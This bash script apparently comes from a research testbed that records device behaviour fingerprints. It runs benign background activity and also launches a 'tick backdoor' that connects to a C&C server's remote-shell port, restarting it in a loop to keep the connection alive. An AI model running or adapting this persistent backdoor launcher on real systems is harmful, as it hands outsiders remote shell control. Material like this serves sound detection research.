#!/bin/bash


############# CONFIGURATION ##########################

# parse options
benign_process_active=false
while getopts "b" opt; do
	case $opt in
		b) benign_process_active=true ;;
		*) echo "Usage $0 [-b   Runs additional benign processes while creating fingerprints.]"; exit 1 ;;
	esac
done
shift $((OPTIND-1))


# cleanup procedure when user kills process
cleanup() {
	printf "\nCaught termination signal. Killing openSenseMap recording\n"
	screen -ls | grep "openSenseMap" | awk '{print $1}' | xargs -r -I {} screen -S {} -X quit
	
	if [ "$benign_process_active" = true ]; then
		ps aux | grep -P "SCREEN -dmS .+_bb" | awk '{print $2}' | xargs sudo kill 2>/dev/null
	fi

	# attempt to kill any fingerprinting processes still running (should be done)
	ps aux | grep "SCREEN -dmS fingerprinting" | awk '{print $2}' | xargs sudo kill 2>/dev/null

	# close socket
	kill SOCKET_PID	2>/dev/null
	exit 0
}
# Trap SIGINT (Ctrl+C) and SIGTERM
trap cleanup SIGINT SIGTERM


# load folder paths
. ./config/folder_paths.config

# load app data
{
	. ./config/app_data.config
} || { 
	printf "\nPlease adjust the data in 'config/preliminary_app_data.config' and rename to 'config/app_data.config'.\n" && exit
}

######################################################



# start benign behavior
screen -dmS openSenseMap -L -Logfile ./logfile.txt $openSenseMap_folder/start_openSenseMap_recording.sh

# start additional benign behavior if option given
if [ "$benign_process_active" = true ]; then
	screen -dmS package_installation_bb bash $benign_behaviors_folder/package_installation_behavior.sh
	screen -dmS ping_bb bash $benign_behaviors_folder/ping_behavior.sh 	
fi

# start listening for config changes
python listen_for_changes.py &
SOCKET_PID=$!

# start listening for C&C server
screen -S tick -L -Logfile "log.txt" $tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell 

# renew connection to prevent crashes
while true; do

	if ! screen -list | grep "SCREEN -S tick"; then
		echo "Restarting tick backdoor"
		screen -S tick $tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell
	fi
	
	sleep 1
done

cleanup
